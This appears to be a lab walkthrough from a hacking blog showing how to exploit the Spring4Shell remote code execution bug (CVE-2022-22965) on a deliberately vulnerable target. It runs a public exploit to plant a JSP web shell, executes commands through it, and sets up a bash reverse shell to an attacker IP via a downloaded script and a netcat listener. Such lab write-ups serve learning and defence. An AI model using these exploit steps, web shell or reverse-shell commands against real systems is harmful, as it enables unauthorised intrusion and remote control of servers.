Welcome back, Hackers, **to The Hacking Journey**, In this exciting articles, we will take a look about Spring4shell,  Spring4Shell, also known as `CVE-2022-22965`, is a remote code execution vulnerability within the Spring Framework. It's a name that resonates with the critical Log4Shell bug revealed in 2021.

## Exploitation 
Now we will explore how the exploitation works in more details.
### Lab Description :
This is a target with direct implementation of the Spring RCE vulnerability CVE-2022-22965, accessible at http://target:8080/helloworld/greeting. The target is here to assist in familiarizing and developing exploits and mitigation tools for this vulnerability.

Upon visiting the web page, you'll immediately notice a prominent message at the top: `Hello World! Exploit me! `.
Searching possible exploits for spring returns the following PoC: [Here](https://github.com/reznok/Spring4Shell-POC/blob/master/exploit.py).
We can try to exploit the vulnerability on this website.
```terminal
â””â”€# python3 exploit.py
usage: exploit.py [-h] --url URL [--file FILE] [--dir DIR]
exploit.py: error: the following arguments are required: --url

â””â”€# python3 exploit.py --url http://10.0.200.14:8080/helloworld/greeting
[*] Resetting Log Variables.
[*] Response code: 200
[*] Modifying Log Configurations
[*] Response code: 200
[*] Response Code: 200
[*] Resetting Log Variables.
[*] Response code: 200
[+] Exploit completed
[+] Check your target for a shell
[+] File: shell.jsp
[+] Shell should be at: http://10.0.200.14:8080/shell.jsp?cmd=id
                                                                
```
Now if we visit that url in browser we will see the answer of the `id` command `uid=33(www-data) gid=33(www-data) groups=33(www-data) // `, then we can change it to another command like `ls`, `whoami` etc..
```terminal
â””â”€# curl -s "http://10.0.200.14:8080/shell.jsp?cmd=ls" --output -
bin
boot
dev
entrypoint.sh
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

## Reverse Shell
Now we can try to get a shell on the server. We copy the payload below and save it in a file called shell.sh. 
`bash -c 'exec bash -i &>/dev/tcp/10.10.5.230/4444 <&1'`
We start a Listner Machine and also an http server Like This:
```terminal
â””â”€# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
In a second terminal, start a Netcat listener:
```terminal
â””â”€# nc -lnvp 4444                                             
listening on [any] 4444 ...
```
Download the script onto the target machine and execute it to establish a reverse shell:
```
# curl http://10.0.200.14:8080/shell.jsp?cmd=curl%2010.10.5.230%2Fshell.sh%20-o%20%2Ftmp%2Fshell.sh%20--output%20-
```
Here, we've encoded all special characters in the curl command to ensure proper execution.
```terminal
â””â”€# python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.0.200.14 - - [13/Oct/2023 12:18:46] "GET /shell.sh HTTP/1.1" 200 -
```
After downloading the script, use a web browser to execute it and trigger the reverse shell:
`http://10.0.200.14:8080/shell.jsp?cmd=bash%20%2Ftmp%2Fshell.sh`
Once executed, you'll receive a reverse shell connection, as indicated by the following:
```
â””â”€# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.5.230] from (UNKNOWN) [10.0.200.14] 47204
